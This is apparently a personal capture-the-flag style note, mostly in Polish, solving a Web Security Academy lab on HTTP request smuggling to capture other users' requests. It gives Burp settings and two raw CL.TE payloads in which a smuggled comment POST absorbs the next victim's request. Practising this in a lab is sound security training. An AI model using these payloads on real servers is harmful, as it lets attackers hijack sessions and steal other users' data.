http request smuggling Capture other

przepchnięte zwykłym requestem i wysłany request z payloadem 2 razy 

payload request 200, drugi 302 (zwykly), payload request x2 500 -> po 500 był comment z wszystkim co trzeba

 
ze wzgledu zeby csrf byl wazny trzeba uzyc ostatnie zapytanie /post/comment
HTTP/1
setting: uncheck: update content lenght + uncheck normalize http1 line endings

 
```
POST / HTTP/1.1
Host: 0ace007c0328f6658070308a0005006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 247
Transfer-Encoding: chunked

 

0

 

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 930
Cookie: session=S3l7JD1DNH2tARRUDoISpWobMcbhBJnV

 

csrf=AcOGAkK0AVohlTLKCyt685jMOJjjVSnw&postId=9&name=CARLOS&email=k%40k.pl&website=&comment=
```


raw
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=
```





<img width="1161" height="494" alt="image" src="https://github.com/user-attachments/assets/0c5c89a3-9ffc-4aae-86d3-4901bd7750b1" />




